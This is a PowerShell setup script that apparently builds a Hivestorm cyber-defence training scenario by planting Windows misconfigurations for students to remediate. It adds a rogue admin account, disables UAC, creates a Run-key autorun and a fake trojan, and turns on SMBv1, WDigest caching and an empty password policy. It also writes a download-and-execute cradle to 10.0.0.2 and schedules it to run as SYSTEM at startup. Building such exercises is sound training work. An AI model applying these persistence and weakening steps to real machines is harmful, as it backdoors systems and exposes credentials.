# Hivestorm HS20 scenario-03 — Windows workstation-style misconfigurations.
$ErrorActionPreference = "Stop"

$roles = Get-Content C:\ProgramData\sysrepair\roles.json | ConvertFrom-Json
$admin       = $roles.admin_user
$adminPw     = $roles.admin_weak_password
$rogue       = $roles.rogue_admin
$autorun     = $roles.autorun_name
$schtaskName = $roles.schtask_name
$trojan      = $roles.trojan_path
$dropScript  = $roles.drop_script

# ---- users --------------------------------------------------------------------
$securePw = ConvertTo-SecureString $adminPw -AsPlainText -Force
New-LocalUser -Name $admin -Password $securePw -PasswordNeverExpires -AccountNeverExpires | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member $admin

$rogueSecure = ConvertTo-SecureString "Changeme!1" -AsPlainText -Force
New-LocalUser -Name $rogue -Password $rogueSecure -PasswordNeverExpires -AccountNeverExpires | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member $rogue

# ---- UAC disabled -------------------------------------------------------------
$polSys = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if (-not (Test-Path $polSys)) { New-Item -Path $polSys -Force | Out-Null }
Set-ItemProperty -Path $polSys -Name EnableLUA -Value 0 -Type DWord

# ---- Autorun in HKLM Run ------------------------------------------------------
$runKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
if (-not (Test-Path $runKey)) { New-Item -Path $runKey -Force | Out-Null }
Set-ItemProperty -Path $runKey -Name $autorun -Value $trojan

# ---- Trojan binary planted ----------------------------------------------------
$trojanDir = Split-Path $trojan
New-Item -ItemType Directory -Force -Path $trojanDir | Out-Null
Copy-Item C:\Windows\System32\cmd.exe $trojan -Force

# ---- Dropped PowerShell payload ----------------------------------------------
$dropDir = Split-Path $dropScript
New-Item -ItemType Directory -Force -Path $dropDir | Out-Null
Set-Content -Path $dropScript -Value "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.2/s.ps1')"

# ---- Scheduled task (SYSTEM) running dropped script ---------------------------
$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
           -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$dropScript`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$princ   = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName $schtaskName -Action $action -Trigger $trigger `
    -Principal $princ -Force | Out-Null

# ---- SMBv1 enabled ------------------------------------------------------------
$smbParam = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
Set-ItemProperty -Path $smbParam -Name SMB1 -Value 1 -Type DWord

# ---- Password policy: minimum length 0 ----------------------------------------
net accounts /minpwlen:0 | Out-Null
net accounts /minpwage:0 | Out-Null
net accounts /maxpwage:unlimited | Out-Null

# ---- WDigest credential caching enabled ---------------------------------------
$wdigest = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
if (-not (Test-Path $wdigest)) { New-Item -Path $wdigest -Force | Out-Null }
Set-ItemProperty -Path $wdigest -Name UseLogonCredential -Value 1 -Type DWord
